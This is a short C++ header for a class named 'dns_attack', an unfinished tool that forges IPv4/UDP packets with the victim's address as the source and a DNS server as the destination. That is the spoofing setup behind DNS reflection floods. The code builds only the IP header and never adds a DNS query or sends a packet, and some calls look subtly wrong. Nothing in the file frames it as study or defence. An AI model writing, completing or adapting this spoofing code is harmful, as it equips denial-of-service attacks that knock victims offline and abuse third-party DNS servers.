#ifndef DNS_ATTACK
#define DNS_ATTACK

#include "misc.h"
#include <string>
#include <iostream>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>

class dns_attack {
private:
	std::string Victim_IP, Server_IP;
	int Source_Port;
public:
	void attack();
	dns_attack();
	dns_attack(std::string Victim_IP, int Source_Port, std::string Server_IP) : Victim_IP(Victim_IP), Source_Port(Source_Port), Server_IP(Server_IP) {};
};


dns_attack::dns_attack() {
	Source_Port = 0;
	Victim_IP = "";
	Server_IP = "";
}

void dns_attack::attack() {
	int sockfd = Socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	{
		int one = 1;
		Setsockopt(sockfd, IPPROTO_UDP, IP_HDRINCL, &one, sizeof(int));
	}

	struct ipheader {
		unsigned char      iph_ihl:5,iph_ver:4; // Little Endian
		unsigned char      iph_tos;
		unsigned short int iph_len;
		unsigned short int iph_ident;
		unsigned char      iph_flag;
		unsigned short int iph_offset;
		unsigned char      iph_ttl;
		unsigned char      iph_protocol;
		unsigned short int iph_chksum;
		unsigned int       iph_sourceip;
		unsigned int       iph_destip;
	};

	struct udpheader {
		unsigned short int udph_srcport;
		unsigned short int udph_destport;
		unsigned short int udph_len;
		unsigned short int udph_chksum;
	};

	char buffer[16384];
	memset(buffer, 0, sizeof(buffer));

	struct ipheader *ip = (struct ipheader *) buffer;

	ip->iph_ihl = 5;
	ip->iph_ver = 4;
	ip->iph_tos = 16; // Low delay
	ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader); // Add the size of DNS data later.
	ip->iph_ident = htons(30678);
	ip->iph_ttl = 64; // hops
	ip->iph_protocol = 17; // UDP
	ip->iph_sourceip = inet_addr(Victim_IP.c_str());
	ip->iph_destip = inet_addr(Server_IP.c_str());
}


#endif
